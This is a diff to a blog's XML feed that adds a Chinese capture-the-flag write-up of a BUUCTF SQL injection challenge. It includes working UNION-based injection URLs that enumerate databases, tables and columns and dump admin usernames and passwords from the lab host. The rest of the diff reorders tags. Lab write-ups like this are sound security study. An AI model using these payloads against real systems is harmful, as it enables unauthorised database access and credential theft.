@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>BUU-SQL注入-寻找注入点</title>
+      <link href="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/"/>
+      <url>/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录一下BUU的一道SQL注入，这道题难点主要在于寻找注入点。</p><h2 id="0x00-启动靶场"><a href="#0x00-启动靶场" class="headerlink" title="0x00 启动靶场"></a>0x00 启动靶场</h2><p>启动靶场后发现只有两个页面，一个是热点页面，一个是登录页面，开始以为登录页面存在注入，测试了很多，万能密码，甚至抓包修改Referer值探测注入点也都没有结果。</p><p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318105309711.png" alt="image-20220318105309711"></p><p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318105320103.png" alt="image-20220318105320103"></p><h2 id="0x01-信息搜集"><a href="#0x01-信息搜集" class="headerlink" title="0x01 信息搜集"></a>0x01 信息搜集</h2><p>登录页面无果后，测试了热点页面，有三篇新闻，随便开一片后发现url的值在变化：</p><p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318105801150.png" alt="image-20220318105801150"></p><p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318105904675.png" alt="image-20220318105904675"></p><p>接着查看源码：</p><p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318110010310.png" alt="image-20220318110010310"></p><p>发现<code>content_detail.php</code>这里也有字段的变化，并且和url的<code>content</code>值相对应，那在这里就能大胆的猜测，<code>content字段</code>这里存在注入点。</p><h2 id="0x02-判断字段数"><a href="#0x02-判断字段数" class="headerlink" title="0x02 判断字段数"></a>0x02 判断字段数</h2><p>既然探测出了 注入点，那接下来就需要判断字段数：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;2 order by 3http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;2 order by 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318110444538.png" alt="image-20220318110444538"></p><p>当判断字段数为3时无回显，字段数为2时，回显正常页面，那这里字段数就是2.</p><h2 id="0x03-判断回显点"><a href="#0x03-判断回显点" class="headerlink" title="0x03 判断回显点"></a>0x03 判断回显点</h2><p>使用联合注入判断回显点：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;-2 union select 1,2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318110613534.png" alt="image-20220318110613534"></p><h2 id="0x04-后续操作"><a href="#0x04-后续操作" class="headerlink" title="0x04 后续操作"></a>0x04 后续操作</h2><p>爆库：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;-2 union select 1,group_concat(schema_name) from information_schema.schemata<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318111344733.png" alt="image-20220318111344733"></p><p>爆表：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;-2 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318112641585.png" alt="image-20220318112641585"></p><p>爆字段：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;-2 union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;FLAG_TABLE&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318112730085.png" alt="image-20220318112730085"></p><p>爆内容：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;-2 union select group_concat(username),group_concat(password) from admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318112104664.png" alt="image-20220318112104664"></p><p><strong>注：</strong>这里得到了管理员的账号和密码，在登录页面输入账号密码得到flag</p><p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318112417918.png" alt="image-20220318112417918"></p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>这道题最主要的难点在于寻找注入点，找到注入点之后，后续操作也就水到渠成了；其次就是信息搜集的重要性，若不花时间去信息搜集，在测试过程中往往很难继续往下进行。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> SQL注入 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> SQL注入 </tag>
+            
+            <tag> 靶场 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>东塔靶场-CTF-命令执行_2</title>
       <link href="/2022/03/16/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2/"/>
       <url>/2022/03/16/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2/</url>
@@ -149,9 +176,9 @@
       
         <tags>
             
-            <tag> CSRF </tag>
-            
             <tag> 靶场 </tag>
+            
+            <tag> CSRF </tag>
             
         </tags>
       
@@ -773,9 +800,9 @@
       
         <tags>
             
-            <tag> 靶场 </tag>
-            
             <tag> SQL注入 </tag>
+            
+            <tag> 靶场 </tag>
             
         </tags>
       
@@ -800,9 +827,9 @@
       
         <tags>
             
-            <tag> 靶场 </tag>
-            
             <tag> SQL注入 </tag>
+            
+            <tag> 靶场 </tag>
             
         </tags>
       
